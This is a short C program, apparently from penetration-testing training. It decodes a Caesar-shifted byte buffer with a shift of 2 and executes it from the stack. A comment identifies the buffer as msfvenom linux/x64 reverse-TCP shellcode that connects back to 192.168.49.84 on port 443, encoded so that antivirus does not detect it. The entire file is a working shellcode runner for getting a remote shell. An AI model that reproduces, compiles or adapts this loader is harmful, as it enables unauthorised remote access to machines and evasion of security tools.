#include <stdio.h>

// Compile with gcc -o caesar_decrypt_exec.out caesar_decrypt_exec.c -z execstack
int main()
{
    // Result of 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.84 LPORT=443 -f c' fed through compiled caesar_encryptor.c
    unsigned char buf[] = "\x6C\x2B\x5A\x9B\x6C\x04\x61\x6C\x03\x60\x11\x07\x4A\x99\x4A\xBB\x04\x02\x03\xBD\xC2\xAA\x33\x56\x53\x4A\x8B\xE8\x6C\x12\x5C\x6C\x2C\x5A\x11\x07\x6C\x05\x60\x4A\x01\xD0\x6C\x23\x5A\x11\x07\x77\xF8\x6C\x3D\x5A\x9B\x4A\xBD\x31\x64\x6B\x70\x31\x75\x6A\x02\x55\x4A\x8B\xE9\x54\x59\x4A\x8B\xE8\x11\x07\x02";

    int key = 2;

    int payload_length = (int) sizeof(buf);

    for (int i=0; i<payload_length; i++)
    {   
        char ch = buf[i];
        buf[i] = ch - key;
    }
    int (*ret)() = (int(*)())buf;
    ret();
}
